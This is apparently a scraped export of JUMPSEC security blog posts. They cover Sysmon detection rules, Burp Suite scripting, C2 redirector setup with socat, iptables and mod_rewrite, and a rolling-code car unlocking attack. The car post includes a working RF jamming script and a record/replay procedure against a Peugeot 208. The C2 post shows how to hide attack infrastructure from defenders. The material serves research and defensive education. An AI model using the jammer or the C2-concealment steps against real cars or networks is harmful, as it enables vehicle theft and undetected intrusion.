condition=\"image\"\u003eOOBCredentials.dll\u003c/ImageLoaded\u003e \u003c/ImageLoad\u003e \u003c/RuleGroup\u003e \u003c/EventFiltering\u003e \u003c/Sysmon\u003e DLL Hijacking event captured by Sysmon. The image will show up as unsigned if the certificate is not trusted.\nCVE-2020-13770 - Named pipe token impersonation\nThis vulnerability is another classic in privilege escalation techniques; in fact, it is one of the methods meterpreter attempts when one runs “getsystem”. The issue takes place when a process opens a named pipe object without explicitly specifying proper security attributes. These security attributes can be specified when calling CreateFile on the “dwFlagsAndAttributes” parameter; among them, the following two are interesting from an attacker’s perspective:\nSECURITY_DELEGATION - Impersonates a client at the Delegation impersonation level. SECURITY_IMPERSONATION - Impersonate a client at the impersonation level. This is the default behavior if no other flags are specified along with the SECURITY_SQOS_PRESENT flag. The first effectively allows for impersonation on remote hosts, while the second only allows that to happen locally. The problem relies on the fact that “SECURITY_IMPERSONATION” is the default value when no other attribute is specified, or when the “SECURITY_SQOS_PRESENT” flag is not set, which leads to this vulnerability being often introduced unwarily.\nUpon opening a named pipe with one of these two security attributes, the server has the access to obtain the client’s token and use it during subsequent access checks; in cases where the client has higher privileges than the server, the server would effectively obtain elevation of privileges. Any process can open a new named pipe object, granted that one with the same name does not already exist, although the impersonation process requires the server process to hold the SeImpersonatePrivilege privilege. By default this is assigned to service users, such as “nt authority\\network service”.\nA further requirement for the privilege escalation process is that the client must write some data to the named pipe before the impersonation process can take place. It is therefore possible for a process to open the pipe with insecure security attributes but not be exploitable to achieve EoP.\nWith regards to detecting exploitation on Unified Endpoint Manager, having identified on which named pipe object the impersonation takes place, pipe creation events can be filtered on their name. Any process other than the legitimate pipe servers can be appended to the exclude rules to be filtered out. Since the pipe is specific to Ivanti software, such a configuration will be effective in giving no false positive. Further events can optionally be correlated to the one targeted here, such as process creations or file operation performed by the same process creating the named pipe object. Note that the exclude rule might need to be edited to the reader’s version of SQL Server.\n\u003cSysmon schemaversion=\"4.22\"\u003e \u003cEventFiltering\u003e \u003cRuleGroup name=\"CVE-2020-13770\" groupRelation=\"and\"\u003e \u003cPipeEvent onmatch=\"include\"\u003e \u003c!-- Monitor CreatePipe events --\u003e \u003cEventType condition=\"is\"\u003eCreatePipe\u003c/EventType\u003e \u003c!-- Only log these named pipes --\u003e \u003cPipeName condition=\"is\"\u003e\\SQLLocal\\ldmsdata\u003c/PipeName\u003e \u003c/PipeEvent\u003e \u003cPipeEvent onmatch=\"exclude\"\u003e \u003c!-- Only log if the pipe is not created by these (legitimate) processes --\u003e \u003cImage condition=\"is\"\u003eC:\\Program Files\\Microsoft SQL Server\\MSSQL13.LDMSDATA\\MSSQL\\Binn\\sqlservr.exe\u003c/Image\u003e \u003c/PipeEvent\u003e \u003c/RuleGroup\u003e \u003c/EventFiltering\u003e \u003c/Sysmon\u003e CreatePipe event captured by Sysmon."},"title":"Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon"},"/articles/2020/12/2020-12-21-win-a-place-hackfu-2021-community-edition/":{"data":{"":"Hello world!\nAt JUMPSEC we’ve managed to get our hands on tickets to what is probably the greatest cyber security event in the calendar, HackFu!\nIn order to be in with a chance of winning you simply need to complete the following challenge which you can download here (the download contains all the information needed to complete the challenge):\nhttps://drive.google.com/file/d/1WFU23lFzGtxW4U5_FPzlbM4auHSZTiGt/view?usp=sharing\nThe deadline for submissions is 6th January 2021, we will announce the lucky winner on 8th January 2021. You don’t need to but feel free to add a bit of detail on your submission - we love hearing about the creative ways in which people solve our challenges.\nIn order to be eligible to win a HackFu ticket you must be able to attend HackFu on Friday 29th January 2021 between 09:30 and 17:30 GMT (it is an online event due to the global pandemic) and you must be at least 18 years old.\nIf you are the lucky winner we will request a postal address from you so that you can receive your HackFu survival pack which is necessary to participate.\nIf you’re not eligible to win the tickets or are unable to attend then you are still very welcome to have a go at the challenge and even to submit your answers or ask us for some help if you get stuck - just let us know not to enter you into the prize draw.\nYou can find out more about, and buy tickets for, HackFu here:\nhttps://chronyko.com/services/hackfu-community-edition/"},"title":"Win a place @HackFu 2021 Community Edition!"},"/articles/2021/04/2021-04-28-burp-suite-python-scripter/":{"data":{"":"","#":"Summary / TL:DR I recently encountered some issues when using Burp Suite Professional which led me to playing around with the Python Scripter extension. The extension allows running custom Python scripts on every request/response processed by Burp, including those generated by functionality such as Burp’s active scanner. This has a number of potential use cases, but I found it particularly useful to re-implement client-side functions that prevented the active scanner from identifying vulnerabilities it would normally detect. The extension is quite simple to use but has a somewhat steep learning curve, so I have shared some of my processes, findings and code samples which may be useful for others in similar situations.\nBackground When working on a recent client project I encountered an issue where the login functionality base64 encoded the username and password before sending it in a JSON request to the server. An example of this is shown below.\n{ \"payload\":\"eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwicGFzc3dvcmQiOiJ0ZXN0cGFzcyJ9\" } The base64 encoded string decodes to {“username”:“testuser”,“password”:“testpass”} which is another JSON body with the input username and password. Unfortunately, at the time this format caused a lot of issues with fuzzing tools such as Burp Suite Professional’s active scanner. When scanning the endpoint Burp wasn’t quite smart enough to handle the encoding and decoding and didn’t fuzz the inner parameters inside the base64 encode input. Knowing that the web server logic wouldn’t correctly decode the fuzzed input, I set out to find a way to scan the parameters before they are encoded and have Burp automatically encode the input before it’s sent to the server.\nI found a number of extensions which appeared to work with base64 encoded values. However, none of these worked when the request to the server was sent in a JSON format. Eventually, I came across the Python Scripter extension [1] which claimed to allow the execution of custom Python scripts on every request/response processed by Burp. As someone who enjoys writing Python scripts this sounded perfect for me and I decided to learn how to use it. Unfortunately, there was very little documentation about the extension and the user interface was simply an empty text box with no additional information.\nAt this point I spent time googling and finding any existing code samples online to try and figure out how to actually use the extension. A particularly useful resource I found was lanmaster53’s pyscripter-er github repo [2] which is worth checking out if you want to learn more advanced usage. Eventually, I managed to get a good enough understanding to be able to make a python script that would take a normal request with a username and password parameter and format it as a base64 encoded string sent in a JSON request. Since carrying out the test and writing this blog post, Burp has been updated and the active scanner now performs fuzzing of base64 encoded input. However, I thought I’d still write this up to provide a resource for understanding how to actually use the Python Scripter extension as base64 encoding was just one example of where it could be useful.\nBasic Setup Along with installing the extension, I recommend installing the logger++ extension [3] as this is useful for viewing the request after it has been modified by the python script. Overall, the basic setup involves three areas:\nThe extension script window – For writing the python code The extension output/error window – For debugging the python code Logger++ – Seeing the transformed request as it is sent to the server Print statements or other python console output will be displayed here, with errors shown in the “Errors” tab.\nIntercepting and Viewing Requests Perhaps the most difficult part when using the extension is figuring out how to actually intercept the requests sent so that you can begin modifying it. As mentioned previously, there isn’t much in the way of documentation, but as the extension makes use of the Burp Suite extender API [4] we can use the documentation for that to learn a bit more about how to interact with requests. We know the extension implements the following variables and after reviewing the extender API documentation we can get a rough estimate of what class or value they correspond to:\nextender – IBurpExtender class callbacks – IBurpExtenderCallbacks class helpers – IExtensionHelpers class toolFlag – Integer value defining which Burp tool created the request messageIsRequest – Boolean value indicating whether the current message being processed is a request messageInfo – IHttpRequestResponse class After reviewing the documentation of these classes, we can make a simple script to print out core information about the request such as the HTTP request headers and the body of a POST request. This includes all the information we likely want to modify such as any request parameters.\nGET Request:\nif messageIsRequest: reqbytes = messageInfo.getRequest() req = helpers.bytesToString(reqbytes) print(req) POST Request:\nif messageIsRequest: reqbytes = messageInfo.getRequest() req = helpers.analyzeRequest(reqbytes) headers = req.getHeaders() parameters = reqbytes[(req.getBodyOffset()):].tostring() print(parameters) With the script included the request headers are stored in the req variable and can be printed to the output window.\nSimilarly, using a script we can access the POST request parameters.\nModifying a Request Now that we can get core information about the request, we can write whatever Python code we want to start extracting specific information from the request and change it. This could be using regular expressions or simply functions such as split and strip to process the input and combine it with specific functions based on the context of the application, e.g. base64 encoding the input.\nAfter we have modified our input value the request will need to be recreated using the new modified input. For GET requests this process is simple, we simply need to convert the modified request back to byte format and then set the message as the new request. For POST requests we will need to build a new request that combines the previous HTTP headers with the modified body and then set this as the new request.\nGET Request:\nnewreq_bytes = helpers.stringToBytes(modified_req) messageInfo.setRequest(newreq_bytes) POST Request:\nnewreq_bytes = helpers.buildHttpMessage(headers,output_body) messageInfo.setRequest(newreq_bytes) Putting it together with the previous code an example GET request where we want to base64 encode an input we could use the following code.\nimport re import base64 if messageIsRequest: reqbytes = messageInfo.getRequest() req = helpers.bytesToString(reqbytes) input_val = re.findall(r'input=[^\\s]*', req)[0].split('\u0026')[0].split('=')[1] output_val = base64.b64encode(input_val) output_param = r'input=%s' % (output_val) output_req = req.replace(input_param, output_param) newreq = helpers.stringToBytes(output_req) messageInfo.setRequest(newreq) There isn’t really much more required to use the extension and whilst there is a lot more that can be done with it, this blog is only intended to help understand how to get started with it by providing some basic usage examples. In the final section of this blog, I’ve added an example showing how to use it to bypass a simple request signing implementation.\nPractical Example – Message Request Signing As I mentioned previously, Burp is now smart enough to recognise the base64 encoded input and inject payloads into the body before its encoded – the original reason I had for using the extension. However, there are a number of potential use cases for the extension. As such, I thought I’d provide an example of another use for it.\nAnother penetration test I conducted featured an application that implemented request signing, where every request sent to the server sent a signature generated from the request. As the signing was carried out by client-side code, it was possible to review the implementation and sign any request we make to the server. However, the signature would break a lot of Burp functionality, including the active scanner, as this isn’t automatically updated for every new request. To overcome this, once the signing implementation is understood, we can then use the Python Scripter extension to carry out the signing process on each request that Burp processes.\nAs an example, I’ve created a very basic PHP web app that simply takes a base64 JSON encoded string containing two user input values and reflects those inputs in the web response. The application also requires a “Signature” header to be sent which contains a SHA256 hash of the length of the body of the POST request. This application is obviously vulnerable to reflected cross-site scripting, but if we try to use Burp’s active scanner to identify this it will fail. This happens as the request signature isn’t updated when fuzzing with XSS payloads, so Burp won’t detect the payloads in the response.\nSimple PHP web app vulnerable to cross-site scripting.\nBase64 string sent as input along with the signature header. Input is reflected in the web response.\nUsing B_urp’s_ a_ctive scanner fails to pick up any cross-site scripting issues_.\nWe want our python script to do a number of things including:\nExtract two input values (input1 and input2) from the starting request. Format them in to a JSON request body. Base64 encode the JSON request body. Use the base64 encoded value as the value of the input parameter. Create a SHA256 hash of the length of the POST request body. Add the hash as a HTTP request header. The following snippet of python code can be used to carry out all of this. We can then copy this into the extension script window, and it will automatically update a basic request with input1 and input2 parameters to the desired format. This will happen for all requests Burp Suite processes including those generated by functionality such as the active scanner, meaning the scanner should now pick up any vulnerabilities.\nimport re import base64 import hashlib if messageIsRequest: reqbytes = messageInfo.getRequest() req = helpers.analyzeRequest(reqbytes) parameters = reqbytes[(req.getBodyOffset()):].tostring() headers = req.getHeaders() val_1 = re.findall(r'input1=[^\\s]*', parameters)[0].split('\u0026')[0].split('=')[1] val_2 = re.findall(r'input2=[^\\s]*', parameters)[0].split('\u0026')[0].split('=')[1] input_val = '{\"input1\":\"%s\",\"input2\":\"%s\"}' % (val_1, val_2) base64_val = base64.b64encode(input_val) output_body = r'input=%s' % base64_val hash_body_len = hashlib.sha256(str(len(output_body)).encode('utf-8')).hexdigest() sig = \"Signature: \" + hash_body_len headers.add(sig) newreq = helpers.buildHttpMessage(headers, output_body) messageInfo.setRequest(newreq) With the script, we can now send a valid request without the signature and without the base64 encoding.\nUsing logger++ we can see that the script automatically modifies the request and adds the signature as well as converts the input into a base64 encoded string.\nNow if we active scan the request the scanner will instantly pick up cross-site scripting vulnerabilities.\nConclusion There are a vast number of potential use cases for the Python Scripter extension when conducting testing using Burp Suite Professional. In particular, it is useful for any scenario where client-side code disrupts the function of automated tools by heavily modifying user input or the request before it is sent to the server. Some potential examples include:\nEncoding / encrypting user input (where keys and algorithms are known) HTTP request signature algorithms Weak captcha implementations Functionality which requires a unique value per request to the server By following the processes outlined in this blog, you should be able to write your own Python scripts which can be executed on any request sent through Burp Suite and use this to overcome application specific complications that interfere with automated testing tools.\nSample scripts for using the Python Scripter extension can be found at the JumpsecLabs GitHub repository [5].\nReferences [1] https://portswigger.net/bappstore/eb563ada801346e6bdb7a7d7c5c52583\n[2] https://github.com/lanmaster53/pyscripter-er\n[3] https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81\n[4] https://portswigger.net/burp/extender/api/\n[5] https://github.com/JumpsecLabs/python-burp"},"title":"Overcoming Issues Using Custom Python Scripts with Burp Suite Professional"},"/articles/2021/07/2021-07-06-securing-against-new-offensive-techniques-abusing-active-directory-certificate-service/":{"data":{"":"SpecterOps recently released an offensive security research paper that details techniques enabling an adversary to abuse insecure functionality in Active Directory Certificate Service.\nSpecterOps reports that abusing the legitimate functionality of Active Directory Certificate Service will allow an adversary to forge the elements of a certificate to authenticate as any user or administrator in Active Directory. JUMPSEC has highlighted numerous changes that can be made to Active Directory Certificate Service configuration to protect the domain through a defence-in-depth approach.\nWe at JUMPSEC wanted to understand the defensive application of this offensive research to pre-emptively defend our clients from these techniques before exploitation is observed in the wild. To do this, we utilised our Active Directory lab and attempted to harden the service to reduce the risk of compromise and limit the ability for an attacker to cause harm.\nIn this article, JUMPSEC has documented the most effective and efficient methods we took to implement the broad defensive guidance in SpecterOps research. In our attempts to harden Active Directory Certificate Service, we have identified ways to harden the environment against compromise, and leverage auditing toolkits to make it easier to identify and remediate areas of exposure.\nRead here for technical extracts or for the full technical guide click here\nArticle written by Dray Agha, Security Researcher | Any questions, comments, or criticisms please drop me a line on: Twitter, Github, or Email"},"title":"Securing against new offensive techniques abusing active directory certificate service"},"/articles/2021/07/2021-07-07-printnightmare-network-analysis/":{"data":{"":"By Dray Agha\nThe infosec community has been busy dissecting the PrintNightmare exploit. There are now variations of the exploit that can have various impacts on a target machine.\nWhen we at JUMPSEC saw that Lares had captured some network traffic of the PrintNightmare exploit in action, I wondered if there was an opportunity to gather network-level IoCs and processes that could offer defenders unique but consistent methods of detection across the various exploits.\nIn this blog, I leverage Tshark and see if it can reveal anything about the networking side of the PrintNightmare exploit. Our goal is purely exploratory, investigating the general workings and network activity of this exploit under the hood. Read More…\nWritten by: Dray Agha, Security Researcher"},"title":"PRINTNIGHTMARE NETWORK ANALYSIS"},"/articles/2021/07/2021-07-16-obfuscating-c2-during-a-red-team-engagement/":{"data":{"":"","#":"","11-c2-in-the-wild#1.1 C2 in the Wild":"","1what-is-command-and-control#\u003cstrong\u003e1.What is Command and Control\u003c/strong\u003e":"","2-redirectors#\u003cstrong\u003e2. Redirectors\u003c/strong\u003e":"","3-redirectors-save-the-red-teams-day#\u003cstrong\u003e3. Redirectors save the Red Team’s day\u003c/strong\u003e ":"","31-dumb-pipe-redirection#\u003cstrong\u003e3.1 Dumb Pipe Redirection\u003c/strong\u003e":"","32-redirection-using-apache-mod_rewrite#\u003cstrong\u003e3.2 Redirection using Apache mod_rewrite\u003c/strong\u003e":"","4-beyond-c2#\u003cstrong\u003e4. Beyond C2\u003c/strong\u003e":"By shd Red Team and Magicians…\n1.What is Command and ControlCommand-and-Control (C2) infrastructure is one the most important tools in a red teamer’s arsenal. In this article, we introduce a few simple methods that red teams use to harden their C2 infrastructure. C2 comes in various forms - but regardless they all share a basic function: they allow the red teamer (or threat actor) to communicate with a compromised machine. During an offensive campaign, testers may accumulate a number of compromised machines but it can be difficult and overwhelming to maintain, orchestrate, and control them in large numbers. On top of this to guarantee the campaign’s longevity, malicious communications back and forth to the compromised machine must be secure, obfuscated, and reliable, adding a further layer of complexity.\n1.1 C2 in the Wild Not all C2s are born equal. Leveraging the right apparatus, with particular design, is paramount to the success of the engagement. Covert offensive engagement can last weeks if not months when simulating a realistic, stealthy attacker. This places significant demands and pressures on the C2 infrastructure. Ethical red teamers and real-world adversaries begrudgingly share many tools and tricks. Both are purveyors of the finest C2 frameworks to manage their malicious campaign from.\nIn the field, there are some choice C2 frameworks for red teamers. Metasploit is incredibly popular for it’s intuitive use and stripped-back command line approach (script-kiddie-friendly indeed!). However, Metasploit loses major points for its fragility and lack of maintainability - the red team can’t trust unreliable tools! There are other C2 frameworks like PowerShell Empire or it’s (GUI-version) successor Covenant that offer a red team the malleability they desire from a C2 infrastructure. However, there is a particular C2 that meets most if not all the red team’s requirements, and are the evidenced-favourite of the adversary: Cobalt Strike.\nAt JUMPSEC we’ve come up against adversaries who have leveraged Cobalt Strike in incredibly sneaky ways. We’ve identified some interesting detections to hunt this C2 down, however it really is a cat and mouse game. As defenders tune and improve their monitoring controls, adversaries will shift their behaviour over time to evade detection - meaning that that defenders must identify new behaviours and techniques to monitor for. Regardless of the obfuscation, C2’s must be commanded and reported back. This beaconing is an ebb and flow that must occur and therefore is something a defender can zero in on to detect across their network. This is no easy feat of course. JUMPSEC’s red team and blue team work together to apply the innovate offensive security research from the red team in defensive context to continuously develop detection for the latest techniques.\nAs criminal adversaries often choose Cobalt Strike as their weapon of choice, blue teams have given it acute attention. Defensive security researchers have devoted entire reports to detecting Cobalt Strike C2 communication! The uncomfortable attention of the blue team has compelled red team operators to ensure that their C2 infrastructure is customised for each assessment, remains covert, and should elude blue team sight for an extended period.\nIn this article, we share some red team tips on hardening command-and-control that ensure offensive engagements remain flexible, reliable, and elusive. There are many ways to harden one’s C2 infrastructure. Let’s zero in on one particular component - redirectors - which we have found are rather important for obfuscation.\n2. Redirectors 2.1 What is a Redirector? Redirectors are an essential component for advanced red teaming. Redirectors allow malicious traffic to come and go as it pleases, but remain hidden from detection. The objective of a redirector is to mask the core C2 infrastructure from prying blue team eyes, and allow the red team operator hidden communication with a compromised machine. Redirectors seek to mask and protect their backend server, the main orchestration server for all C2.\nSimplified, but you get the idea\nRedirectors offer many advantages around obfuscation but they also offer a resilience and persistence advantage. If the blue team are able to successfully identify and block an IP address associated with the C2 infrastructure, the red team operator can quickly spin up a redirector and continue to keep the core backend server IP address hidden. 2.2 Example of C2 without a Redirector To understand the benefit of a redirector, let’s demonstrate how easy an attentive blue team defender can shut down and ruin a red team engagement that uses a vanilla C2. We can use msfvenom to generate a payload that doesn’t do anything special, it simply creates an executable that will call back to our C2 server. There’s no obfuscation, no clever C2-over-DNS techniques, no redirection - nothing!\nIf we take this C2 payload and execute it on a machine, we will inevitably be caught by any blue team worth their salt. Using netstat on the target machine, from a defender’s perspective it’s clear to see the machine is currently communicating to a strange and new IP address on port 8080, based on an unusual executable (C2test.exe).\nThis would invariably stand out to a defender as suspicious - they would not recognise the executable (even if it was called something less obvious) and would not recognise the private IP in the conversation. The blue team would quarantine the machine and sever the malicious connection we worked so hard to establish.\n3. Redirectors save the Red Team’s day The above is a textbook example of red team bad practice. A better approach is to use redirectors to prevent the infrastructure from being exposed at the first hurdle.\nThere are a plethora of redirection techniques, and we couldn’t possibly spoil all of our own fun by sharing them (the blue team can read too you know?). We’ll focus on the technical approach behind network traffic redirection. 3.1 Dumb Pipe Redirection Dumb pipe redirection does exactly what it says on the tin. It blindly forwards our malicious traffic from node to node, but lacks sophistication for controlling the traffic. It does however allow us to obfuscate the IP of the core server, so that’s all that matters for now.\nTo achieve dumb pipe redirection we can rely on socat, with different firewall implementations to improve it. 3.1.1 Socat The following socat command would be run on our burnable redirector server to enable dumb pipe redirection towards our C2 server. sudo socat TCP4-LISTEN:8080,fork TCP:c2address:PORT This allows TCP network traffic on port 8080 of the redirection machine to communicate on port 8080 of the C2 server. So now our C2 server can communicate with our disposable redirection server, we now need to put the compromise machine in communication with the redirection server. This then allows a nice chain of communication from C2 server, to redirector, to compromised machine, which remains hidden from the eyes of defenders. We now need to generate a payload that will complete the link in the chain and allow the compromised machine to communicate to our redirect server, the middle-man.\nWe can take this executable payload and detonate it on the target machine.When executed, it connects to our redirector server, which then forwards TCP port 8080 to our core C2 server blindly. In the screenshot below, we can see that there is a three-machine relay for communication: the top image shows the 172.16.15.135 target machine in communication with the redirector server on x.x.13.49:8080, the redirector machine is then in communication with the C2 server on x.x.x.223:8080. If the blue team catch us now, all we will lose is the redirector server and not our core infrastructure.\n3.1.2 Socat and Uncomplicated Firewall There is, however, one disavantadge to this method of socat dumb pipe redirection. Anyone with the redirector’s IP address can now connect to our listener via the specified port. Let’s illuminate this using the network scanning tool nmap, which shows that we’re running a proxy (the redirector). A defender would definitely notice if there was an unrecognised web proxy in communication with a machine in their internal network. To avoid this situation, let’s maker our dumb pipe redirector a bit smarter. We can configure a firewall that will protect our infrastructure and allow only the redirector to directly connect. In this case, we’re going to use ufw, which stands for Uncomplicated Firewall and is available for a variety of UNIX distributions. Let’s configure UFW on our core C2 server and redirector server to allow for traffic monitoring:\nLet’s configure Port 22, which is usually reserved for SSH services. Let’s configure Traffic from our redirector IP outbound and inbound from TCP port 8080\nAnd then let’s finish up by disallowing outbound traffic anywhere else\nWhat we have here is a firewall configuration that allows C2 communication from our malicious core server to our malicious core redirector. We then need to duplicate our efforts on the redirector server’s firewall.\nWhen we’re all done, our tracks should be covered. We can confirm this using nmap. When we scan our Core C2 IP address, it now displays as filtered, indicating that traffic is secured and is only accessible via the redirector server. Awesome for us, not so much for the blue team!\n3.1.3 IPTables Redirection IPtables is a unix tool that allows granular control of network traffic, down to the packet level. It’s an incredibly powerful tool that can be leveraged for both defense and offense - let’s try the latter. It is possible to acheive same result as socat dumb pipe redirection but using IPTables instead. Here, we specify exactly which network traffic packets should accepted or dropped, and where they should be forwarded or rerouted in order to meet our tailored specification for masking the traffic to and from our core C2 server. The end result is similar to socat and ufw, and we manage to communicate from C2 server, to redirector, to compromised endpoint all without revealing the C2 server to the blue team! In the screenshot below, we’re actively running malicious commands to the compromised machine whilst leveraging the granular iptables rules to obfuscate our rerouted malicious network traffic. 3.2 Redirection using Apache mod_rewrite An alternate method to dumb pipe redirection employs Apache mod_rewrite, which offers a number of techniques to strengthen our infrastructure. Essentially, apache mod_rewrite allows a proxy to behave differently if fed different arbitrary information - such as user agent, operating system, IP address and more. This creates more varied network traffic, as the rules we give will dictate if traffic should be dropped, accepted, or redirected according to particular prescribed behaviour. There is significant time and effort consumption to using this method compared to socat and the firewalls, delivering improved results in return. We can accomplish this by specifying rulesets and a .htaccess file in the webserver’s root directory. In our case, we’re going to create a rule that redirects curious visitors to our labs.jumpsec.com page. Let’s take a deep dive into setting this up. 3.2.1 Configuring Apache Mod_Rewrite To begin, we need Apache2 on our redirection server. We then need to open up its configurations file, and change AllowOverride from None to All inside /etc/apache2/apache.conf to begin the process of abusing mod_rewrite for our own malicious intent. We then can enable Apache2 module rewrite, and follow up by restarting the apache web service so the change can take effect. sudo a2enmod rewrite proxy proxy_http sudo service apache2 restart Then, within the web server’s root directory, we must create a .htaccess file. This will filter traffic based on our specified criteria and is therefore a crucial component in this whole operation (so let’s not make any mistakes here!). Set .htaccess file’s chmod permissions to 644.\n3.2.2 Malicious Rules Now that we’ve installed the necessities, let’s get to work. We need to create our ruleset that will filter proxy traffic based on arbitrary behaviours / strings that we give to the web server. Let’s create a rule that behaves differently depending on if an incoming request has a particular directory. Only we will know the secret directory that will facilitate malicious traffic. To everyone else, we will forward them to this awesome site we know…\nIn the above ruleset, we can see that if the directory /jstest is explicitly included in the http(s) traffic, it will be forwarded to our C2 core server running on x.x.x.223. If any traffic attempts to come that does not include that specific /jstest directory, then the apache web server will behave differently and reroute the nosey, inquisitive investigator to labs.jumpsec.com.\nTo the unwitting visitor to our redirector middle-man server, they are simply visiting the JUMPSEC labs website. They did include the secret /jstest directory in their request, and therefore they will not discover the hidden malicious infrastructure we have set up.\nConversely, by offering the /jstest directory in a request, we are able to control and issue commands across our obfuscated communication line. In our example below, we could have had something incredibly sophisticated and malicious…instead we chose to issue a warning.\n3.2.3 Integrating mod_rewrite elsewhere It’s awesome to use mod_rewrite to arbitrarily change the behaviour of our web server. However the default C2 usability of this method is unwieldy. In the example below, we can see it’s a bit clunky and doesn’t lend itself to the rapid action that a red team operator needs. It is possible to fit this apache mod_rewrite technique in as a component to other C2 infrastructure. Earlier, we spoke about Metasploit, and whilst it isn’t the most reliable of it’s peers it is quite flexible and good at fitting new components in. We can make Metasploit and apache mod_rewrite play nicely with each other, which will make our ability to issue commands that much easier.\nIn Metasploit, we can leverage the -URI uriflag. If we run a meterpreter payload on the compromised machine, we can ensure that only payloads with this URI flag can connect to our C2 Server, preventing anybody interested from peeking into our domains. This step doesn’t just ensure our C2 remains hidden but also improves the usability of our redirections.\n4. Beyond C2This article only covered one of the many elements of the offensive security arsenal. Robust and obfuscated C2 is one of the most critical actions that successful red teamers and real-world attacker’s alike take when compromising a network. I hope that this high-level article demonstrates that creating a covert infrastructure is a critical step in effective and covert attack simulation.\nThere is much more to talk about overall about the red team’s attack path repertoire. And there is still more to talk about C2 itself! There are so many ways to customise a C2 infrastructure that some have even written and deployed C3 infrastructure as part of their engagements. Adversaries in real life have used C3 to create kernel-level APIs that they then use to communicate, rather than utilising the protocols and services that C2 uses (like SSH or HTTPs). The limits are truly endless for command-and-control.\nShd is a Red Team Operator @ JUMPSEC"},"title":"Obfuscating C2 During a Red Team Engagement"},"/articles/2021/07/2021-07-22-car-hacking-manual-bypass-of-modern-rolling-code-implementations/":{"data":{"algorithms#Algorithms":"Two are the main algorithms used to send opening signals to cars:\n- Single code: The keyfob always sends the same code to the car that accepts it and opens. This is an old implementation used by cars manufactured until ~2002. This legacy implementation lacks basic security since whoever intercepts the signal is able to use it to open the car (known as a replay attack). Surprisingly, in my experience, I still found modern cars implementing such algorithms. - Rolling code: The keyfob uses an array of codes, each of which is only usable once. This much safer implementation that protects against replay attacks and is mostly used in modern cars, the most recent version will be our main focus for this research. [2]","background#Background":"","first-test-replay-attack#First Test: Replay Attack":"To start playing around with radio frequencies, I bought a cheap radio doorbell - made of a transmitter (an actual button to stick out of the doorstep) and a couple of receivers that ring when the doorbell is clicked, then I started playing around with that. Since doorbells are quite cheap and do not need an enhanced security, they implement a basic single code algorithm, useful for testing.\nWith that in mind, the first step was to see the signal sent from the remote doorbell using HackRF and gqrx, a tool that visualises radio frequencies. Once the frequency and other settings have been set up, I observed the output shown in Figure 1.\nFigure 1 - gqrx tracking the signal of the doorbell when the button is clicked.\nNote that usually the real frequency can be slightly moved from the one detected, depending also on the temperature of the room. From the specs, we know that the doorbell works at 433.92 MHz.\nOnce visualized, I tried to dump the data the doorbell is sending.\nFigure 2 - Universal Radio Hacker (urh) [6] showing the recorded signal as a waveform.\nIf carefully analyzed, we can see that the waveform is actually containing 4 equal repeated signals. Below the waveform, the software is able to convert the signal to bytes. This happens through the specified modulation (in the picture on the left, Amplitude-shift keying, aka ASK). The problem with approaching modulations is that since it can totally change the output code, we should know which type the signal is using and that is often not specified.\nTo bypass that problem, I chose to work at Signal level, modifying the actual signal and not dealing with the output code.\nOnce I recorded the signal, I cropped it to a single repetition and transmitted it through the HackRF, making the doorbell receiver ring and proving that the path followed was right.","implementation#Implementation":"In this example, I will explain how I hacked into a Peugeot 208 from 2020 that implements rolling code. Since the key to the rolling code attack and the most difficult part of its bypass is the ability to jam and record at the same time, I will focus on the explanation of such functionality, skipping the rest of the process since it is only a matter of implementation and it is easily replicable.\nNote that the car and keyfob communicate at a frequency of 433.92 MHz.\nAfter several tests and implementations that ended up being not functional, I reached a proper one using the Yard Stick One to jam and the HackRF to deal with the unlocking signals sent from the keyfobs.\nHere’s the really simple Python3 script I wrote to jam the signal:\nfrom rflib import * d = RfCat() d.setFreq(433800000) d.setMdmModulation(MOD_ASK_OOK) d.setMdmDRate(4800) print(\"Starting\") while(1): d.RFxmit(b\"\\x17\\x17\\x17\\x17\\x17\\x17\\x17\\x00\\x00\\x00\\x00\\x00\\x00\"*10) As you can see from the script, the jamming frequency is set at 433.80 MHz, exactly 120 kHz below the frequency used by the keyfob but still in the range accepted by the car.\nOnce the script is run, the car won’t be able to receive other signals and will keep being closed even if the owner clicks the opening button.\nMeanwhile we are jamming, we need to use a tool able to both record and send signals from my laptop. I personally found GNU Radio the best tool to do so, and I wrote two scripts, one to record and the other one to replay the signal recorded.\nFigure 8 - 1st script used to save the signal received in a file.\nThe first script is made of a osmocom [5] Source block that is set to work with the HackRF, recording a signal at a central frequency of 433.92MHz with a bandwidth of 100 kHz. The bandwidth setting will allow the HackRF to cut out the jamming signal, cleaning it and recording only the part we need (the actual keyfob opening signal). It will then send it to a live GUI that will show us the peaks in the frequency spectrum and save it to a file called Peugeot_208.\nAll of these must happen while the Python3 jamming script represented in the portion of code above keeps running.\nFigure 9 - 2nd script used to replay the signal previously saved.\nOnce the python script has been interrupted, the second script will grab the Peugeot 208 file with the filtered signal in it, multiply it and send it to both a GUI and to the HackRF, which will transmit it to the car.\nAnd here’s the magic:\nThe car will receive the signal and open.","introduction#Introduction":"IntroductionI recently researched modern algorithms used by keyfobs to open cars. Since most of the blogs online talking about the topic are unfortunately quite old and in general and do not precisely describe the exact path followed in detail, nor the code used. I thought that talking about my experience could be interesting and inspiring for other researchers.\nI won’t go in depth on certain topics and I will assume that the reader has a general background in basic signals theory and is comfortable with terms like radio frequencies, gain, filters…\nAll the scripts used to reproduce the attack are downloadable at the following link:\nGithub.com: Rolling_Code_Bypass\nNOTE: This thread is the first part of a research that focuses on finding a way to automatically bypass car mechanisms implementing different algorithms. Following posts will be shared during the next few months.\nDISCLAIMER: All the information provided on this post is for educational purposes only. JUMPSEC is no way responsible for any misuse of the information.","my-path#My Path":"","references#References":"[1] https://en.wikipedia.org/wiki/Remote_keyless_system\n[2] https://en.wikipedia.org/wiki/Rolling_code\n[3] https://greatscottgadgets.com/hackrf/one/\n[4] https://greatscottgadgets.com/yardstickone/\n[5] https://osmocom.org/\n[6] https://github.com/jopohl/urh\n[7] https://gqrx.dk/","rolling-code-bypass-theory#Rolling Code Bypass Theory":"Since hacking into a doorbell was not as satisfying as I expected, I tried to raise the level of the research to Rolling codes, trying first to understand the exact process needed.\nThe methodology I am going to describe requires both some exploitation techniques and a little bit of social engineering.\nThe basic “Rolljam Attack” - that’s how various blogs online call it - is based on forcing the victim to send 2 (instead of 1) opening signals, intercepting them in a way that the owner of the car will not notice that one of the two codes has been stolen and is ready to be used. Also, the attacker needs to be close enough 